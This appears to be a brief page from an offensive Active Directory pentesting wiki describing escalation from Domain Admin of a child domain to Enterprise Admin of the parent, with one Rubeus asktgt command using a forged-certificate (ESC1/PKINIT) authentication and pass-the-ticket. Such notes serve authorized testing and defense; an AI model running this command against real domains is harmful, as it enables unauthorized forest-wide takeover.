# DA to EA

When you get DA to a domain via [#pkinit-authentication](../misc/ad-authentication.md#pkinit-authentication "mention"), for instance with [esc1.md](../adcs/exploitation/esc1.md "mention"), you can get Enterprise Admin of a parent domain via:

```powershell
> Rubeus asktgt /user:parentdomain.local\Administrator /dc:dc.parentdomain.local /certificate:<cert> /password:<pass> /nowrap /ptt
```
